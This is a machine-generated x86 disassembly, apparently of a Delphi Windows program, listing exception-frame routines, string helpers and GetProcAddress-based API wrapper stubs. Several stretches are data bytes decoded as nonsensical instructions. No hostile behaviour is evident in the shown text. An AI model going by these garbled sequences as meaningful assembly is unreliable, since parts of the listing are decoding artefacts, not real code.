mov esi [ ebp - 0x3c ]
sub ecx esi
dec ecx
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x78 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
push [ ebx ]
lea eax [ ebp - 0x58 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x58 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
lea eax [ ebp - 0x7c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x7c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x80 ]
push eax
mov edx [ ebp - 0x38 ]
inc edx
mov ecx 0x3
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x80 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
push [ ebx ]
lea eax [ ebp - 0x84 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x84 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
sub_4644dc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4645c5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_463eb4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov esi 0x8
mov ebx edi
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0xb
lea ecx [ ebp - 0x14 ]
mov eax [ r-xdata ]
pop edx
call sub_4624e8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov [ ebx ] ax
add ebx 0x2
dec esi
jne r-xdata
call sub_403e2c
push 0x1
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov ecx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_462668
cmp eax 0xffff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645cc
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
sub_4645ec
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_46462c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_46468c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x10 ] 0x1000
mov eax ebx
call sub_405324
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xffffffff
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4646de
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push 0x0
push 0x406d1388
call RaiseException
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4646f0
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
sete al
mov edx eax
mov ecx r-xdata
mov eax [ r-xdata ]
call sub_46328c
mov eax ebx
call sub_405120
push eax
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_405120
mov ecx eax
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
add edx eax
mov eax 0x1
dec eax
test ebx ebx
je r-xdata
call sub_403e2c
cmp eax [ ebx - 0x4 ]
jb r-xdata
inc eax
lea eax [ ebx + eax - 0x1 ]
call sub_402f9c
sub_46478c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x1
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] bl
pop esi
pop ebx
retn
sub_4647c4
push ebp
mov ebp esp
push ebx
mov ebx eax
push 0x8
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
pop ebx
pop ebp
retn 0x8
sub_464808
push ebx
push esi
mov ebx edx
mov esi eax
push 0x4
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov [ eax ] esi
pop esi
pop ebx
retn
sub_464840
push ebx
push esi
mov ebx edx
mov esi eax
push 0x4
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov [ eax ] esi
pop esi
pop ebx
retn
sub_464878
push ebx
push esi
mov ebx edx
mov esi eax
push 0x2
mov eax ebx
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ ebx ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov [ eax ] si
pop esi
pop ebx
retn
sub_4648b0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x1
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
mov [ edx + eax ] bl
pop esi
pop ebx
retn
sub_4648e8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
push ebx
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
push ebx
mov ecx esi
xor edx edx
mov eax edi
call sub_463a00
pop edi
pop esi
pop ebx
retn
sub_46491c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
push ebx
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
mov edx [ esi ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
add edx eax
mov eax edi
mov ecx ebx
call sub_402f9c
pop edi
pop esi
pop ebx
retn
sub_46499c
add esp 0xfffffff8
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
add eax edx
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4649fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_406474
xor eax eax
push ebp
push sub_464ada
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_406248
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
call sub_406248
dec eax
push eax
push r-xdata
xor ecx ecx
mov edx esi
mov eax [ r-xdata ]
call sub_463274
test esi esi
je r-xdata
mov ebx eax
mov eax edi
mov edx ebx
call sub_4055ac
test ebx ebx
jle r-xdata
call sub_403e2c
mov eax [ ebp - 0x4 ]
call sub_406248
sub eax esi
cdq
push edx
push eax
mov eax ebx
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464ae1
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax edi
call j_sub_405330
mov edx 0x1
dec edx
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
inc edx
lea edx [ eax + edx - 0x1 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
add eax esi
mov ecx ebx
call sub_402f9c
sub_464b0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_464b62
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b69
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4646f0
push 0xffffffff
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_463610
sub_464b84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_464c0c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push esi
lea edx [ ebp - 0x4 ]
xor ecx ecx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c13
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
lea eax [ edx + eax ]
mov edx [ ebp - 0x8 ]
mov ecx ebx
call sub_402f9c
sub_464c1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_464c77
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor ebx ebx
push ebx
lea ecx [ ebp - 0x4 ]
mov eax edi
mov edx ebx
call sub_46491c
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464c7e
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_464c88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cdq
push edx
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_403e2c
sub_464cb4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov ebp edx
mov esi eax
test ebx ebx
jge r-xdata
mov eax [ esi ]
call sub_406248
mov edi eax
lea eax [ ebx + edi ]
push eax
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push ebx
mov edx esi
mov ecx edi
mov eax ebp
call sub_463a88
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405120
mov ebx eax
sub_464d00
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx ebx
mov eax [ r-xdata ]
call sub_462b4c
test eax eax
sete al
pop esi
pop ebx
retn
sub_464d34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_464db9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
setl dl
mov ecx r-xdata
mov eax [ r-xdata ]
call sub_46328c
mov eax esi
call sub_405120
cmp ebx eax
jle r-xdata
lea eax [ ebp - 0x4 ]
dec ebx
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
call sub_403e2c
cmp ebx [ esi - 0x4 ]
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464dc0
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
inc ebx
movzx edx [ esi + ebx - 0x1 ]
call sub_40502c
mov eax [ ebp - 0x4 ]
mov edx edi
call [ rw-data ]
test eax eax
setg al
mov ebx eax
sub_464df1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_464e2a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e31
retn
mov edx rw-data
mov eax [ r-xdata ]
call sub_462560
sub_464e35
out 0x4a eax
add ah dl
inc [ eax ]
add ah dh
out 0x4a eax
add ch dl
inc [ eax ]
add ah dh
out 0x4a eax
add dh dl
inc [ eax ]
add ah dh
out 0x4a eax
add bh dl
inc [ eax ]
add ah dh
out 0x4a eax
add al bl
inc [ eax ]
add ah dh
out 0x4a eax
add cl bl
inc [ eax ]
add ah dh
out 0x4a eax
add dl bl
inc [ eax ]
add ah dh
out 0x4a eax
add bl bl
inc [ eax ]
add ah dh
out 0x4a eax
add ah bl
inc [ eax ]
add ah dh
out 0x4a eax
add ch bl
inc [ eax ]
add ah dh
out 0x4a eax
add dh bl
inc [ eax ]
add ah dh
out 0x4a eax
add bh bl
inc [ eax ]
add al ah
dec esi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
dec edi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] dl
inc esi
add [ eax ] dh
add [ eax ] al
add [ eax + 0x50 ] dh
inc ecx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbe26 ] ch
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
add [ ecx + edx * 2 + 0x41 ] ch
add [ edx ] al
add [ edi ] cl
dec ecx
inc edx
popad
jae r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + edx * 2 + 0x54170046 ] ch
dec ecx
dec ecx
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x657a696c
jb r-xdata
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
inc ebx
outsd
insd
add [ edi + ecx * 2 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x46 ] dl
outsd
insd
jo r-xdata
inc ecx
add [ eax ] al
loop r-xdata
outsb
outsb
je r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbe26 ] ch
outsb
outsb
inc esi
add [ edi + ecx * 2 ] ch
inc esi
add [ edx ] al
add [ edi ] cl
dec ecx
inc edx
add ah ah
fiadd [ ecx ]
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x4fb40040 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
inc esi
jo r-xdata
dec edi
inc esi
add [ edi ] al
pop ss
push esp
dec ecx
dec ecx
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x657a696c
jb r-xdata
mov ebx edi
inc ebx
outsd
insd
jo r-xdata
popad
jae r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ eax + edx * 2 + 0x54100046 ] ch
dec ecx
inc edx
popad
jae r-xdata
add [ eax ] al
add [ esi + ecx * 2 - 0x1e17ffba ] dl
inc ecx
add [ eax ] al
add [ eax ] al
call 0x304695dc
outsd
insd
jo r-xdata
psubsb mmx0 [ ebx - 0xe ]
stc
jmp [ edi + ecx * 4 + 0x5 ]
outsb
outsb
je r-xdata
mov [ ebx + ebx * 8 - 0x7e17f08c ] 0xf2
stc
jmp [ edi + ecx * 4 + 0x5 ]
inc ebx
outsd
insd
jo r-xdata
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
lodsb [ esi ]
outsb
outsb
je r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
add [ eax ] al
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
outsb
outsb
je r-xdata
je r-xdata
outsb
dec esi
inc esi
add al ch
dec edi
inc esi
add [ eax ] dh
inc eax
add [ eax ] al
push eax
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc edx
popad
jae r-xdata
mov eax eax
inc ebx
outsd
insd
jo r-xdata
dec [ ebx - 0xef743a ]
push edx
xor [ ebx + 0x74db84c6 ] cl
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x762e173a ] cl
sti
outsb
outsb
je r-xdata
add ah dl
fiadd [ ecx ]
int3
dec edi
sub_465030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_41da5c
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_465070
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41da5c
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4650b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_465070
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_46920c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4692ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_404e98
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_404288
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40d3a0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_404e98
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_4631dc
mov ecx edi
xor edx edx
mov eax ebx
call sub_4631dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4692b3
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
sub_4692b3
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4692e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46937a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_405324
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469381
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_40ada8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46920c
sub_4693b3
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_4693eb
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_469417
inc [ eax + eax ]
add [ eax ] al
bound ebp [ ecx + 0x6e ]
add [ fs : eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_469458
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_469490
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_4694cc
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_469508
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0xc
sub_469544
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
sub_469643
dec [ ecx ]
add [ eax ] al
add [ ecx + 0x6e ] ch
je r-xdata
add eax 0x6e000000
je r-xdata
outsb
je r-xdata
arpl [ esi ] si
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x18
push 0x6c
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
movzx eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
add [ eax + r-xdata ] bh
popad
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x8
sub_4696ab
inc [ 0x6e000000 ]
je r-xdata
arpl [ esi ] si
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x18
push 0x6c
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
movzx eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x4
sub_4696ea
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x10
sub_46976d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
sub_4697a3
inc [ esi ]
add [ eax ] al
add [ ebx + 0x65 ] dh
insb
arpl [ gs : eax + eax ] si
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x10
sub_4697e9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x18
sub_469823
inc [ esi ]
add [ eax ] al
add [ ebx + 0x65 ] dh
outsb
je r-xdata
add [ eax ] al
add [ ebx + 0x68 ] dh
jne r-xdata
add [ eax ] al
push ebp
mov ebp esp
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ebp
retn 0x14
outsd
jae r-xdata
outsd
ja r-xdata
outsb
popad
insd
add [ gs : ebp - 0x75 ] dl
in al dx
mov edx rw-data
mov eax r-xdata
call sub_4692e4
mov eax [ ebp + 0xc ]
push eax
